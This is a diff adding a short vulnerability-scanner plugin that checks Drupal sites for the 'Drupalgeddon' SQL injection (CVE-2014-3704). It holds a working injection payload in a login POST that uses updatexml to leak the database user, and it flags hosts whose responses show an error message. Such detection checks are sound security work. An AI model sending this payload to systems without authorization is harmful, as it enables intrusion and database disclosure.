@@ -1,0 +1,14 @@
+#request url = var
+#define payload = /?q=node&destination=node
+#define bug = The website encountered 
+#define info = 存在Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）
+#define post = pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a
+
+function main(args)
+{
+	res = HttpPost(url.payload,post,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
